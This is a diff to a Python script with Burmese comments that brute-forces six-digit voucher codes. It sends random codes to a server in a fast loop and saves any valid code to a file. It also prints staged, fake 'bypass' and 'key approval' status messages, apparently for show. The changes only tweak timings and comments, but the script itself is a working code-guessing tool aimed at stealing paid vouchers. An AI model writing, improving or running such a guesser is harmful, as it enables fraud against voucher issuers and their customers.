@@ -25,21 +25,22 @@ def show_menu():
 def start_scanning():
     os.system('clear')
     
-    # ၁။ တစ်ဆင့်ချင်းစာတန်းတက်လာစေရန် (ဗီဒီယိုအတိုင်း)
+    # ဗီဒီယိုထဲကအတိုင်း တစ်ဆင့်ချင်း စာတန်းတက်လာစေရန်
     print(f"{CYAN}[+] Checking Bypass...{END}")
-    time.sleep(0.6)
-    print(f"{CYAN}[+] Done.{END}")
     time.sleep(0.5)
+    print(f"{CYAN}[+] Done.{END}")
+    time.sleep(0.4)
     print(f"{CYAN}[+] Checking user key approval...{END}")
+    time.sleep(0.6)
+    print(f"{CYAN}[+] This action will take afew minute...{END}")
     time.sleep(0.7)
-    print(f"{CYAN}[+] This action will take a few minute...{END}")
-    time.sleep(0.8)
     print(f"{CYAN}[+] 1-Trying to connect server...{END}")
     time.sleep(1.0)
     print(f"{WHITE}[+] Connection to Server: {GREEN}OK{END}\n")
     time.sleep(0.5)
 
     while True:
+        # 6 digit code ထုတ်ခြင်း
         code = str(random.randint(0, 999999)).zfill(6)
         
         params = {
@@ -53,21 +54,21 @@ def start_scanning():
         try:
             res = requests.get(url, params=params, timeout=1.5)
             
-            # ၂။ မရတဲ့ (Fail) code ကို အနီရောင်ဖြင့် တန်းစီကျလာစေရန်
+            # Fail ဖြစ်လျှင် အနီရောင်စာတန်း တန်းစီကျလာမည်
             if "failed" in res.text.lower() or "expire" in res.text.lower():
                 print(f"{RED}Fail Code: {code}{END}")
             
-            # ၃။ ရတဲ့ (Success) code ကို အစိမ်းရောင်ဖြင့်ပြရန်
+            # Success ဖြစ်လျှင် အစိမ်းရောင်ဖြင့်ပြမည်
             elif res.status_code == 200:
                 print(f"{GREEN}\n[SUCCESS] FOUND VALID VOUCHER: {code}{END}")
                 with open("success.txt", "a") as f:
                     f.write(f"Success: {code} | {time.ctime()}\n")
                 break
         except Exception:
-            # ချိတ်ဆက်မှုမရလျှင်လည်း အနီရောင်ဖြင့်ပြမည်
+            # Server Timeout သို့မဟုတ် ချိတ်ဆက်မှုမရလျှင် အနီရောင်ဖြင့်ပြမည်
             print(f"{RED}Error: {code} (Server Timeout){END}")
         
-        # Scanner Speed
+        # Scanner အမြန်နှုန်း (လိုသလို ညှိနိုင်သည်)
         time.sleep(0.05)
 
 if __name__ == "__main__":
